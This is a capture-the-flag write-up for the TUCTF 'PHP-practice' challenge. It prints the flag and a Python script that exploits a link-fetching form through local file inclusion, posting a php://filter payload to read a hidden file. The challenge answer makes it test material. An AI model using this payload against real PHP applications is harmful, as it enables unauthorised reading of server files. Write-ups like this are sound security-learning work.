# PHP-practice challenge
<p align="center">
  <img src="Attachments/Description.jpg" />
</p>


## FLAG:
`TUCTF{th1s_i5_my_secr3t_l0c@l_f1le!}`

## Solution

the challenge provides a simple form that asks for a link to be entered. After a link is entered, it downloads its content and then shows it. If for example we give as input a link to an image then the server downloads it and displays it with an img tag. After several attempts, I found that an LFI could be exploited and with this vulnerability I first read the .htaccess file which gave me the name of the flag. In this python script, I provide my solution to grab the flag from the site:

```python
import requests

burp0_url = "http://php-practice.tuctf.com:80/display.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://php-practice.tuctf.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://php-practice.tuctf.com/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = {"link": "php://filter/resource=gcfYAvzsbyxV.txt"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```

